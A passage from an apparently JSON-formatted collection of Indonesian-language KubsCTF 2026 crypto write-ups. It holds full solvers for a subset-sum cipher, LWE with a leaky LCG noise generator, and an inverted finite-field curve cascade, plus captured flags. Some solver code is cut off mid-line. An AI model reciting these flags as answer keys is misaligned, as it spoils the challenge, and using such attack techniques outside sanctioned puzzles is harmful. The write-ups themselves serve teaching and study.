main()\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-crypto-llawliet",
    "title": "L's Encrypted Transmissions",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "crypto",
      "kubsuctf",
      "2026"
    ],
    "description": "**Category:** Crypto  \n**Technique:** Subset Sum / Knapsack, Meet-in-the-Middle  \n**Files:** `params.txt`  \n**Flag:** `KubSTU{y0u_n33d_70_6e_4_re41_d373ct1ve_7o_5o1v3_7h15}`",
    "problemDescription": "> L's encrypted transmissions were intercepted. One public key, the message split into blocks. How L turns a block into a single number is implied by the data. Turning it back is your problem.\n\nDiberikan `n = 64`, sebuah array `w` berisi 64 bilangan bulat, dan tujuh ciphertext berupa bilangan bulat. Tidak ada modulus, private key, atau algoritma dekripsi yang disediakan.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge",
        "content": "> L's encrypted transmissions were intercepted. One public key, the message split into blocks. How L turns a block into a single number is implied by the data. Turning it back is your problem.\n\nDiberikan `n = 64`, sebuah array `w` berisi 64 bilangan bulat, dan tujuh ciphertext berupa bilangan bulat. Tidak ada modulus, private key, atau algoritma dekripsi yang disediakan.\n\nTujuannya adalah mengembalikan plaintext dari tujuh angka tersebut.",
        "code": ""
      },
      {
        "title": "1. Mengenali subset sum",
        "content": "Setiap bobot `w[i]` bernilai sekitar \\(10^{25}\\), sedangkan ciphertext bernilai sekitar \\(10^{26}\\). Bentuk yang masuk akal untuk enkripsi satu blok adalah menjumlahkan sebagian bobot publik:\n\n\\[\nC = \\sum_{i=0}^{63} b_i w_i, \\qquad b_i \\in \\{0,1\\}.\n\\]\n\nArtinya, setiap ciphertext adalah instance **subset-sum problem**: kita diberi bobot \\(w_i\\) dan hasil penjumlahannya \\(C\\), lalu harus mencari bit \\(b_i\\) yang dipakai.\n\nKarena ada 64 bit per blok, satu blok kemungkinan menyimpan delapan karakter ASCII:\n\n\\[\n64\\text{ bit} = 8\\text{ byte}.\n\\]\n\nBit karakter disusun **MSB-first** (bit paling signifikan lebih dulu). Untuk blok `m` berukuran 8 byte, enkripsinya dapat ditulis sebagai:\n\n\\[\nE(m)=\\sum_{j=0}^{7}\\sum_{k=0}^{7}\n\\left(\\left(m_j \\gg (7-k)\\right)\\mathbin{\\&}1\\right)w_{8j+k}.\n\\]\n\nContohnya, huruf `K` memiliki representasi biner `01001011`. Karena `K` mengisi byte pertama, kontribusinya adalah \\(w_1+w_4+w_6+w_7\\), bukan bobot yang dibalik urutannya.",
        "code": ""
      },
      {
        "title": "Memverifikasi format blok pertama",
        "content": "Dengan asumsi format flag `KubSTU{...}`, tujuh karakter pertama pada blok pertama sudah diketahui: `KubSTU{`.\n\nHitung kontribusi tujuh karakter tersebut, kemudian uji 256 kemungkinan untuk karakter kedelapan:\n\n\n\nHasilnya:\n\n\n\nIni mengonfirmasi bahwa model penjumlahan bobot, urutan bit, dan panjang blok sudah benar.",
        "code": "prefix = b\"KubSTU{\"\n\ndef contribution(position, byte, w):\n    return sum(\n        w[8 * position + bit]\n        for bit in range(8)\n        if (byte >> (7 - bit)) & 1\n    )\n\nfixed = sum(contribution(i, ch, w) for i, ch in enumerate(prefix))\nfor candidate in range(256):\n    if fixed + contribution(7, candidate, w) == ciphertexts[0]:\n        print(prefix + bytes([candidate]))"
      },
      {
        "title": "2. Kenapa brute force biasa tidak cukup?",
        "content": "Jika setiap bit dicoba bebas, kita perlu mempertimbangkan \\(2^{64}\\) kemungkinan untuk **satu blok**. Brute force langsung tidak realistis.\n\nUntuk subset sum umum, **Meet-in-the-Middle (MITM)** membagi 64 bit menjadi dua bagian dengan masing-masing 32 bit. Kita mencari:\n\n\\[\nC=L+R.\n\\]\n\nSecara generik, ini masih membutuhkan hingga \\(2^{32}\\) kombinasi *per sisi*. Terlalu besar untuk pendekatan sederhana.\n\nNamun plaintext challenge ini adalah teks bergaya flag CTF, bukan 64 bit acak. Untuk blok setelah prefix, karakter yang perlu dicari bisa dibatasi ke:\n\n\n\nAda 40 karakter, termasuk byte NUL (`\\0`) yang mungkin digunakan sebagai padding blok terakhir.\n\nDengan membagi blok 8 karakter menjadi dua kelompok 4 karakter, jumlah kombinasi per sisi turun menjadi:\n\n\\[\n40^4 = 2{}560{}000.\n\\]\n\nIni bisa ditangani di memori biasa dengan C++.\n\n> Pembatasan alfabet adalah asumsi pencarian, bukan kelemahan matematis pada semua subset sum. Asumsi ini valid untuk pesan flag yang berhasil ditemukan, dan hasil akhirnya diverifikasi terhadap ciphertext asli.",
        "code": "abcdefghijklmnopqrstuvwxyz0123456789_{}\\0"
      },
      {
        "title": "3. Meet-in-the-Middle atas karakter",
        "content": "Definisikan kontribusi bobot untuk satu byte `ch` pada posisi `pos`:\n\n\\[\nA(pos,ch)=\\sum_{k=0}^{7}\n\\left(\\left(ch\\gg(7-k)\\right)\\mathbin{\\&}1\\right)w_{8pos+k}.\n\\]\n\nUntuk karakter \\(m_0,\\ldots,m_7\\), pisahkan jumlah menjadi dua:\n\n\\[\nL = \\sum_{j=0}^{3} A(j,m_j), \\qquad\nR = \\sum_{j=4}^{7} A(j,m_j).\n\\]\n\nYang dicari adalah pasangan empat karakter kiri dan empat karakter kanan sehingga:\n\n\\[\n\\boxed{L+R=C}.\n\\]\n\nAlgoritmanya:\n\n1. Hitung \\(A(pos,ch)\\) untuk semua 8 posisi dan 256 nilai byte.\n2. Enumerasi semua kombinasi empat karakter dari alfabet dan simpan `(jumlah, karakter)` untuk sisi kiri dan kanan.\n3. Urutkan kedua daftar berdasarkan `jumlah`.\n4. Untuk setiap ciphertext, gunakan *two-pointer*: pointer kiri dari jumlah terkecil dan pointer kanan dari jumlah terbesar.\n5. Jika `L + R < C`, naikkan pointer kiri. Jika `L + R > C`, turunkan pointer kanan. Jika sama, dua kelompok karakter tersebut membentuk plaintext yang valid.\n\nBagian inti pencocokannya:\n\n\n\nDengan \\(M = 40^4\\), kedua daftar membutuhkan \\(O(M)\\) memori. Pembuatan dan sorting memerlukan \\(O(M\\log M)\\), sedangkan pencocokan tiap ciphertext memerlukan \\(O(M)\\) setelah daftar dibuat.\n\nSolver memakai `unsigned __int128`, karena ciphertext mendekati 90 bit sehingga tidak muat dalam integer 64-bit. Setiap entri disimpan dalam struktur 16 byte (`lo`, `hi`, dan indeks karakter yang di-*pack*), sehingga dua daftar berisi sekitar 82 MB data mentah.",
        "code": "size_t i = 0, j = right.size();\nwhile (i < left.size() && j > 0) {\n    auto sum = value(left[i]) + value(right[j - 1]);\n    if (sum == target) {\n        // Decode kedua entri menjadi blok plaintext 8 karakter.\n        break;\n    } else if (sum < target) {\n        ++i;\n    } else {\n        --j;\n    }\n}"
      },
      {
        "title": "4. Hasil dekripsi",
        "content": "Setelah kedua tabel dibuat, keenam ciphertext sisanya ditemukan dengan pencocokan jumlah subset yang eksak.\n\n| Block | Plaintext 8 byte |\n|---:|---|\n| 0 | `KubSTU{y` |\n| 1 | `0u_n33d_` |\n| 2 | `70_6e_4_` |\n| 3 | `re41_d37` |\n| 4 | `3ct1ve_7` |\n| 5 | `o_5o1v3_` |\n| 6 | `7h15}\\x00\\x00\\x00` |\n\nKetujuh blok digabungkan berurutan, lalu tiga byte NUL pada blok terakhir dibuang.",
        "code": "KubSTU{y0u_n33d_70_6e_4_re41_d373ct1ve_7o_5o1v3_7h15}"
      },
      {
        "title": "Verifikasi",
        "content": "Setiap blok dikonversi kembali ke 64 bit, lalu dihitung ulang:\n\n\\[\nC'_j = \\sum_{i=0}^{63} b_{j,i}w_i.\n\\]\n\nUntuk seluruh tujuh blok, hasilnya identik dengan ciphertext yang diberikan:\n\n| Block | Recomputed ciphertext |\n|---:|---:|\n| 0 | `497994755863057405933630374` |\n| 1 | `508694844706487270636105167` |\n| 2 | `527630280838317716773094973` |\n| 3 | `463560018566498790558286776` |\n| 4 | `493565358761271805468731483` |\n| 5 | `566039950648282399263875713` |\n| 6 | `310833993322957764462819748` |\n\nJadi hasilnya bukan sekadar string yang terlihat seperti flag: **semua blok memenuhi persamaan enkripsi aslinya**.",
        "code": ""
      },
      {
        "title": "5. Reproduksi",
        "content": "Simpan solver sebagai `solve_llawliet.cpp` dan pastikan `params.txt` berada pada direktori yang sama.\n\nUbah parameter Python menjadi input numerik untuk program C++:\n\n\n\nKompilasi dan jalankan:\n\n\n\nOutput akhir:",
        "code": "python3 - <<'PY' > input.txt\nns = {}\nexec(open(\"params.txt\").read(), ns)\nprint(*(ns[\"w\"] + ns[\"ciphertexts\"]), sep=\"\\n\")\nPY"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.cpp`) untuk mengotomatisasi eksploitasi:",
        "code": "#include <bits/stdc++.h>\nusing namespace std;\nusing u128=unsigned __int128;\nstruct Entry { uint64_t lo; uint32_t hi; uint32_t packed; };\ninline bool operator<(const Entry&a,const Entry&b) {return a.hi != b.hi ? a.hi<b.hi : a.lo<b.lo;}\ninline u128 value(const Entry &a) {return ((u128)a.hi<<64)|a.lo;}\nstatic u128 parse(const string&s){u128 ans=0;for(char c:s)if(c>='0'&&c<='9')ans=ans*10+c-'0';return ans;}\nstatic string str(u128 v){if(!v)return \"0\";string s;while(v){s.push_back('0'+v%10);v/=10;}reverse(s.begin(),s.end());return s;}\nint main(int argc,char**argv){\n ios::sync_with_stdio(false);cin.tie(nullptr);\n u128 w[64];for(auto &wi:w){string s;if(!(cin>>s))return 1;wi=parse(s);}\n vector<u128> ct;string s;while(cin>>s)ct.push_back(parse(s));\n string charset=\"abcdefghijklmnopqrstuvwxyz0123456789_{}\";charset.push_back('\\0');\n int K=charset.size();cerr << \"Alphabet size: \"<<K<<\", search size per side: \"<<(uint64_t)pow(K,4)<<\"\\n\";\n u128 add[8][256]{};\n for(int pos=0;pos<8;pos++)for(int ch=0;ch<256;ch++)for(int k=0;k<8;k++) if((ch>>(7-k))&1)add[pos][ch]+=w[8*pos+k];\n vector<Entry> sides[2];\n for(int side=0;side<2;side++) {\n  auto &vec=sides[side];vec.reserve((size_t)K*K*K*K);\n  int off=side*4;\n  for(int a=0;a<K;a++)for(int b=0;b<K;b++)for(int c=0;c<K;c++)for(int d=0;d<K;d++) {\n   u128 sum=add[off][(uint8_t)charset[a]]+add[off+1][(uint8_t)charset[b]]+add[off+2][(uint8_t)charset[c]]+add[off+3][(uint8_t)charset[d]];\n   vec.push_back({(uint64_t)sum,(uint32_t)(sum>>64), (uint32_t)((((a*K+b)*K+c)*K+d))});\n  }\n  sort(vec.begin(),vec.end());cerr << \"Built side \" <<side<<\": \"<<vec.size()<<\"\\n\";\n }\n auto decode=[&](uint32_t packed){string res(4,'?');for(int i=3;i>=0;i--){res[i]=charset[packed%K];packed/=K;}return res;};\n string flag;\n if(!ct.empty()) {\n   string prefix=\"KubSTU{\";\n   u128 fixed=0;\n   for(int k=0;k<7;k++)fixed += add[k][(uint8_t)prefix[k]];\n   bool found_first=false;\n   for(int v=0;v<256;v++) {\n      if(fixed+add[7][v] == ct[0]) {\n        string block=prefix+(char)v;\n        cerr << \"[FOUND 0] \" << block << \"\\n\";\n        cout << 0 << \" \" << block << \"\\n\";\n        flag=block;\n        found_first=true;\n        break;\n      }\n   }\n   if(!found_first) cerr << \"[WARN] First block does not match expected KubSTU{ prefix\\n\";\n }\n for(int t=1;t<(int)ct.size();t++){\n  auto &L=sides[0], &R=sides[1];size_t i=0,j=R.size();int found=0;\n  while(i<L.size()&&j>0){u128 sum=value(L[i])+value(R[j-1]);if(sum==ct[t]){\n     string result=decode(L[i].packed)+decode(R[j-1].packed);\n     string human;for(unsigned char x:result)if(x==0)human+=\"\\\\x00\";else human+=x;\n     cerr << \"[FOUND \"<<t<<\"] \"<< human<<\"\\n\";\n     cout << t << \" \" << human << \"\\n\";cout.flush();found++;\n     if(found==1){for(char ch:result)if(ch != '\\0')flag += ch;}\n     if(found>=20)break;\n     ++i;--j;\n   }else if(sum<ct[t])++i;else --j;\n  }\n  if(!found) cerr<<\"[FAIL \"<<t<<\"] no matching 8-byte block in charset\\n\";\n }\n if(!flag.empty())cout << \"\\nFLAG: \" << flag << \"\\n\";\n}\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{y0u_n33d_70_6e_4_re41_d373ct1ve_7o_5o1v3_7h15}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-crypto-thedeterministicfog",
    "title": "The Deterministic Fog",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "crypto",
      "kubsuctf",
      "2026"
    ],
    "description": "File yang diberikan berisi implementasi LWE dan satu output session. Bagian yang langsung menarik perhatian ada di generator noise:",
    "problemDescription": "State awal hanya 48 bit, sedangkan calibration membocorkan 8 bit teratas dari 24 state pertama. Nilai LCG dan seluruh trace tersedia di `output.json`, jadi yang perlu dipulihkan adalah 40 bit bawah state awal.\n\nMisalkan `B = 2^40` dan trace memberi nilai `y_i = x_i >> 40`. Tulis:",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Memulihkan state LCG",
        "content": "Misalkan `B = 2^40` dan trace memberi nilai `y_i = x_i >> 40`. Tulis:\n\n\n\nKarena LCG affine, setiap state bisa ditulis sebagai:\n\n\n\nState awal juga bisa dipisah menjadi `x_0 = y_0*B + z`, dengan `z` sebagai satu-satunya bagian yang dicari. Untuk setiap trace setelah state pertama:\n\n\n\nJadi ada vektor lattice yang dekat dengan target. Basis yang dipakai solver adalah:\n\n- diagonal `2^48` untuk menyerap carry `k_i`;\n- baris koefisien `A_i` dan koordinat terakhir `1` untuk variabel `z`;\n- target trace yang sudah dikurangi bagian yang diketahui.\n\nLLL mereduksi basis tersebut, lalu `CVP.closest_vector` mengambil vektor terdekat. Koordinat terakhirnya memberi `z`. Hasilnya:\n\n\n\nSolver kemudian menjalankan LCG ulang dan memeriksa semua 24 byte calibration, bukan hanya mengandalkan hasil CVP.",
        "code": "x_i = y_i*B + z_i,       0 <= z_i < B"
      },
      {
        "title": "Mendapatkan noise dan secret LWE",
        "content": "`StreamSampler` melanjutkan LCG sampai state `x_24`, lalu menghasilkan noise dengan:\n\n\n\nUrutan noise pertama dipakai oleh 200 public samples, kemudian dilanjutkan untuk ciphertext.\n\nPublic sample memenuhi:\n\n\n\nSetelah `e` diketahui, sistemnya menjadi linear biasa:\n\n\n\n`q=257` adalah prima dan matriks `A` memiliki rank penuh untuk 40 kolom, sehingga Gaussian elimination modular memulihkan `s`. Solver memverifikasi ulang semua 200 sample sebelum dekripsi.",
        "code": "noise = state % 201 - 100"
      },
      {
        "title": "Dekripsi",
        "content": "Ciphertext memakai encoding bit:\n\n\n\nDengan seed yang sudah dipulihkan, noise ciphertext juga diketahui. Mengurangi `R*s` dan `e` menyisakan tepat `0` untuk bit nol atau `128` untuk bit satu. Bit-bit tersebut digabungkan dalam urutan MSB-first menjadi byte.\n\nHasilnya:",
        "code": "c = R*s + e + bit*(q//2) (mod q)"
      },
      {
        "title": "Menjalankan solver",
        "content": "Aktifkan environment yang memiliki `fpylll`, lalu jalankan:\n\n\n\nSolver mencetak seed, secret LWE, plaintext, dan flag dalam format `<FLAG>...</FLAG>`.",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\"\"\"Solver for The Deterministic Fog.\"\"\"\n\nimport json\nfrom pathlib import Path\n\nfrom fpylll import CVP, IntegerMatrix, LLL\n\n\ndef recover_seed(data):\n    params = data[\"params\"]\n    sampler = data[\"sampler\"]\n    calibration = data[\"calibration\"]\n\n    modulus = 1 << sampler[\"mod_bits\"]\n    low_bound = 1 << sampler[\"hide\"]\n    multiplier = sampler[\"mult\"]\n    increment = sampler[\"inc\"]\n\n    # x_i = A_i*x_0 + B_i (mod modulus)\n    affine = []\n    A_i, B_i = 1, 0\n    for _ in calibration:\n        affine.append((A_i, B_i))\n        A_i = (multiplier * A_i) % modulus\n        B_i = (multiplier * B_i + increment) % modulus\n\n    # The leaked high byte fixes x_0 = calibration[0]*2^hide + z.\n    # For i > 0:\n    #   A_i*z + A_i*x_base + B_i = calibration[i]*2^hide + z_i + k_i*M\n    # with 0 <= z,z_i < 2^hide.  CVP finds the short error vector.\n    x_base = calibration[0] * low_bound\n    count = len(calibration) - 1\n    target = [\n        calibration[i] * low_bound\n        - affine[i][0] * x_base\n        - affine[i][1]\n        for i in range(1, len(calibration))\n    ]\n\n    lattice = IntegerMatrix(count + 1, count + 1)\n    for i in range(count):\n        lattice[i, i] = modulus\n    for i in range(count):\n        lattice[count, i] = affine[i + 1][0]\n    lattice[count, count] = 1\n\n    LLL.reduction(lattice)\n    closest = CVP.closest_vector(lattice, target + [0])\n    low = closest[-1]\n    if not 0 <= low < low_bound:\n        raise RuntimeError(\"lattice returned an invalid low state\")\n\n    seed = x_base + low\n\n    # Exact trace validation prevents accepting a merely close CVP result.\n    state = seed\n    for expected in calibration:\n        if state >> sampler[\"hide\"] != expected:\n            raise RuntimeError(\"recovered seed does not match calibration\")\n        state = (multiplier * state + increment) % modulus\n    return seed\n\n\ndef generate_noise(data, seed):\n    params = data[\"params\"]\n    sampler = data[\"sampler\"]\n    modulus = 1 << sampler[\"mod_bits\"]\n    multiplier = sampler[\"mult\"]\n    increment = sampler[\"inc\"]\n    bound = params[\"bound\"]\n\n    # StreamSampler starts at x_calib, after advancing x_0 through x_calib.\n    state = seed\n    for _ in range(sampler[\"calib\"]):\n        state = (multiplier * state + increment) % modulus\n\n    total = len(data[\"b\"]) + len(data[\"ciphertext\"])\n    noise = []\n    for _ in range(total):\n        noise.append(state % (2 * bound + 1) - bound)\n        state = (multiplier * state + increment) % modulus\n    return noise\n\n\ndef solve_modular_system(matrix, rhs, modulus):\n    \"\"\"Solve a full-column-rank system over Z_modulus.\"\"\"\n    rows = [[value % modulus for value in row] + [value % modulus]\n            for row, value in zip(matrix, rhs)]\n    row_count = len(rows)\n    col_count = len(matrix[0])\n    pivot_row = 0\n    pivots = []\n\n    for col in range(col_count):\n        pivot = next(\n            (i for i in range(pivot_row, row_count) if rows[i][col]), None\n        )\n        if pivot is None:\n            continue\n        rows[pivot_row], rows[pivot] = rows[pivot], rows[pivot_row]\n        inverse = pow(rows[pivot_row][col], -1, modulus)\n        rows[pivot_row] = [x * inverse % modulus for x in rows[pivot_row]]\n\n        for i in range(row_count):\n            if i == pivot_row or rows[i][col] == 0:\n                continue\n            factor = rows[i][col]\n            rows[i] = [\n                (left - factor * right) % modulus\n                for left, right in zip(rows[i], rows[pivot_row])\n            ]\n\n        pivots.append(col)\n        pivot_row += 1\n\n    if len(pivots) != col_count:\n        raise RuntimeError(f\"LWE matrix rank is only {len(pivots)}\")\n\n    solution = [0] * col_count\n    for i, col in enumerate(pivots):\n        solution[col] = rows[i][-1]\n    return solution\n\n\ndef decrypt(data, secret, noise):\n    q = data[\"params\"][\"q\"]\n    offset = len(data[\"b\"])\n    bits = []\n\n    for row, ciphertext_value, error in zip(\n        data[\"R\"], data[\"ciphertext\"], noise[offset:]\n    ):\n        phase = sum(x * y for x, y in zip(row, secret))\n        residue = (ciphertext_value - phase - error) % q\n        if residue not in (0, q // 2):\n            raise RuntimeError(f\"invalid decrypted bit residue: {residue}\")\n        bits.append(1 if residue == q // 2 else 0)\n\n    return bytes(\n        sum(bits[i + j] << (7 - j) for j in range(8))\n        for i in range(0, len(bits), 8)\n    )\n\n\ndef main():\n    data = json.loads(Path(\"output.json\").read_text(encoding=\"utf-8\"))\n    q = data[\"params\"][\"q\"]\n    seed = recover_seed(data)\n    noise = generate_noise(data, seed)\n\n    public_rhs = [b - e for b, e in zip(data[\"b\"], noise)]\n    secret = solve_modular_system(data[\"A\"], public_rhs, q)\n\n    # Verify every public sample before touching the ciphertext.\n    for row, b, error in zip(data[\"A\"], data[\"b\"], noise):\n        if (sum(x * y for x, y in zip(row, secret)) + error) % q != b:\n            raise RuntimeError(\"public LWE sample verification failed\")\n\n    message = decrypt(data, secret"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{lw3_574nd5_f0r_l0v3ly_w153_c4pyb4r4}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-crypto-whatdoyouknowaboutperelman",
    "title": "What do you know about Perelman?",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "crypto",
      "kubsuctf",
      "2026"
    ],
    "description": "`cascade.py` bekerja di `F_4003` dan mengiterasikan pasangan `(a, b)` sebanyak 30 kali:",
    "problemDescription": "Komentar di `encrypted.txt` memberi tahu bahwa password AES dibentuk dari pasangan awal:\n\nJadi pasangan pada gambar harus dipakai sebagai pasangan terminal `(a30, b30)`, kemudian dicari balik untuk mendapatkan `(a0, b0)`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan artefak",
        "content": "`cascade.py` bekerja di `F_4003` dan mengiterasikan pasangan `(a, b)` sebanyak 30 kali:\n\n\n\nKomentar di `encrypted.txt` memberi tahu bahwa password AES dibentuk dari pasangan awal:\n\n\n\nJadi pasangan pada gambar harus dipakai sebagai pasangan terminal `(a30, b30)`, kemudian dicari balik untuk mendapatkan `(a0, b0)`.",
        "code": "K = 4a^3 + 27b^2\na' = a - 12a^2K mod 4003\nb' = b - 54bK mod 4003"
      },
      {
        "title": "Memulihkan kurva dari PNG",
        "content": "Ukuran `curve.png` adalah `4003 x 4003`, sama dengan ukuran koordinat di `F_4003`.\n\n![Corrupted finite-field curve](/assets/writeups/kubsctf_2026/crypto-whatdoyouknowaboutperelman/curve.png) Gambar berisi marker hitam 3x3, ditambah titik-titik noise dan beberapa marker yang saling menempel. Center tiap connected component diambil sebagai titik `(x, y)`.\n\nSource code menyebut keluarga Weierstrass:\n\n\n\nUntuk setiap titik kurva, nilai berikut harus memenuhi persamaan garis di `F_4003`:\n\n\n\nNilai `A` hanya punya 4003 kemungkinan. Untuk setiap `A`, script menghitung `B = r - A*x` untuk semua titik dan memilih `B` dengan vote terbanyak. Noise tidak membentuk vote yang konsisten.\n\nHasil voting:\n\n\n\nTitik yang rusak tidak perlu dipulihkan satu per satu karena pasangan koefisien tetap muncul sebagai puncak histogram.",
        "code": "y^2 = x^3 + A*x + B"
      },
      {
        "title": "Membalik satu langkah cascade",
        "content": "Misalkan target satu langkah adalah `(ap, bp)`. Nilai `K` dicoba dari seluruh `F_4003`.\n\nDari persamaan untuk `a`:\n\n\n\nUntuk `K != 0`, akar dicari dengan diskriminan:\n\n\n\nPersamaan `b` biasanya langsung memberi:\n\n\n\nKasus denominator nol ditangani terpisah dengan mencari akar kuadrat dari persamaan `K = 4a^3 + 27b^2`. Setiap kandidat tetap diverifikasi terhadap definisi `K`, sehingga akar palsu dibuang.\n\nPembalikan 30 langkah dari `(3104, 3194)` menyisakan 20 pasangan kandidat. Semua kandidat dipakai untuk membentuk key scrypt dan mencoba dekripsi AES-CBC. Hanya satu yang menghasilkan padding PKCS#7 valid dan plaintext berformat flag:",
        "code": "ap = a - 12*K*a^2\n12*K*a^2 - a + ap = 0"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\"\"\"Recover the AES key from the corrupted finite-field curve image.\"\"\"\n\nfrom pathlib import Path\nimport re\n\nimport cv2\nimport numpy as np\nfrom Crypto.Cipher import AES\nfrom Crypto.Protocol.KDF import scrypt\n\n\nBASE = Path(__file__).resolve().parent\nP = 4003\nN = 30\nSALT = b\"perelman/ricci/v2\"\n\n\ndef curve_centers(path: Path) -> list[tuple[int, int]]:\n    \"\"\"Extract the centers of the small black markers from the PNG.\"\"\"\n    image = cv2.imread(str(path), cv2.IMREAD_GRAYSCALE)\n    if image is None:\n        raise FileNotFoundError(path)\n\n    black = (image == 0).astype(np.uint8)\n    count, _, stats, centroids = cv2.connectedComponentsWithStats(black, 8)\n    points = set()\n    for i in range(1, count):\n        x, y, width, height, area = map(int, stats[i])\n        # Ordinary markers are 3x3.  A few touch after corruption, so keep\n        # larger connected components and use their centroid as a point.\n        if area >= 6:\n            cx, cy = centroids[i]\n            points.add((int(round(cx)) % P, int(round(cy)) % P))\n    return sorted(points)\n\n\ndef recover_curve(points: list[tuple[int, int]]) -> tuple[int, int]:\n    \"\"\"Fit y^2 = x^3 + A*x + B over F_P by exhaustive A/B voting.\"\"\"\n    x = np.asarray([q[0] for q in points], dtype=np.int64)\n    y = np.asarray([q[1] for q in points], dtype=np.int64)\n    residual = (y * y - x * x * x) % P\n\n    best = (-1, None, None)\n    for a in range(P):\n        b_values = (residual - a * x) % P\n        counts = np.bincount(b_values, minlength=P)\n        b = int(np.argmax(counts))\n        score = int(counts[b])\n        if score > best[0]:\n            best = (score, a, b)\n\n    score, a, b = best\n    if score < 1000 or a is None or b is None:\n        raise RuntimeError(f\"could not identify a curve (best vote={score})\")\n    return int(a), int(b)\n\n\ndef make_field_tables() -> tuple[list[int], list[list[int]]]:\n    inverses = [0] + [pow(x, -1, P) for x in range(1, P)]\n    roots = [[] for _ in range(P)]\n    for y in range(P):\n        roots[y * y % P].append(y)\n    return inverses, roots\n\n\nINV, SQRT_ROOTS = make_field_tables()\n\n\ndef one_step(a: int, b: int) -> tuple[int, int]:\n    k = (4 * pow(a, 3, P) + 27 * pow(b, 2, P)) % P\n    return (\n        (a - 12 * a * a * k) % P,\n        (b - 54 * b * k) % P,\n    )\n\n\ndef cascade(a: int, b: int) -> tuple[int, int]:\n    for _ in range(N):\n        a, b = one_step(a, b)\n    return a, b\n\n\ndef inverse_step(ap: int, bp: int) -> set[tuple[int, int]]:\n    \"\"\"Enumerate all (a,b) mapping to (ap,bp) in one flow step.\"\"\"\n    result: set[tuple[int, int]] = set()\n    inv27 = INV[27]\n\n    # Enumerating K makes the two equations low-degree.  For K != 0:\n    #   12*K*a^2 - a + ap = 0\n    # and then b follows linearly unless 1-54*K vanishes.\n    for k in range(P):\n        if k == 0:\n            a_roots = (ap,)\n        else:\n            discriminant = (1 - 48 * k * ap) % P\n            denominator = (24 * k) % P\n            a_roots = tuple(\n                ((1 + root) * INV[denominator]) % P\n                for root in SQRT_ROOTS[discriminant]\n            )\n\n        factor = (1 - 54 * k) % P\n        for a in a_roots:\n            if factor:\n                b_roots = (bp * INV[factor] % P,)\n            elif bp == 0:\n                rhs = ((k - 4 * pow(a, 3, P)) * inv27) % P\n                b_roots = tuple(SQRT_ROOTS[rhs])\n            else:\n                b_roots = ()\n\n            for b in b_roots:\n                if (4 * pow(a, 3, P) + 27 * b * b) % P == k:\n                    result.add((a, b))\n    return result\n\n\ndef decrypt(a: int, b: int, iv: bytes, ciphertext: bytes) -> bytes | None:\n    password = a.to_bytes(4, \"big\") + b.to_bytes(4, \"big\")\n    key = scrypt(password, SALT, 32, 65536, 8, 1)\n    plaintext = AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext)\n    padding = plaintext[-1]\n    if not 1 <= padding <= AES.block_size:\n        return None\n    if plaintext[-padding:] != bytes([padding]) * padding:\n        return None\n    return plaintext[:-padding]\n\n\ndef main() -> None:\n    points = curve_centers(BASE / \"curve.png\")\n    terminal = recover_curve(points)\n    print(f\"markers={len(points)} terminal_curve={terminal}\")\n\n    candidates = {terminal}\n    for depth in range(N):\n        candidates = {\n            previous\n            for current in candidates\n            for previous in inverse_step(*current)\n        }\n        print(f\"reverse_depth={depth + 1} candidates={len(candidates)}\")\n\n    encrypted = (BASE / \"encrypted.txt\").read_text()\n    iv = bytes.fromhex(re.search(r\"iv\\s*=\\s*([0-9a-f]+)\", encrypted).group(1))\n    ciphertext = bytes.fromhex(re.search(r\"ct\\s*=\\s*([0-9a-f]+)\", encrypted).group(1))\n\n    solutions = []\n    for a, b in sorted(candidates):\n        if cascade(a, b) != terminal:\n            continue\n        plaintext = decrypt(a, b, iv, ciphertext)\n        if plaintext is not None and plaintext.startswith(b\"KubSTU{\"):\n            solutions.append(((a, b), plaintext))\n\n    if len(solutions) != 1:\n        raise RuntimeError(f\""
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{45_a_m4773r_0f_f4c7_h3_b3c4m3_7he_f1r57_p3rs0n_to_s01v3_0n3_0f_th3_m1ll3nn1um_pr1z3_pr0bl3m5}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-crypto-capy256k1",
    "title": "capy256k1 — Invalid-Curve Attack",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "crypto",
      "kubsuctf",
      "2026"
    ],
    "description": "**Kategori:** Crypto / Elliptic Curve Cryptography  \n**Flag:** `KubSTU{1t_l00k3d_str41ght_1n_d3v}`",
    "problemDescription": "`capy256k1.py` menggunakan kurva Weierstrass pendek:\n\n\\[\nE: y^2 \\equiv x^3 + 7 \\pmod p.\n\\]",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Akar masalah",
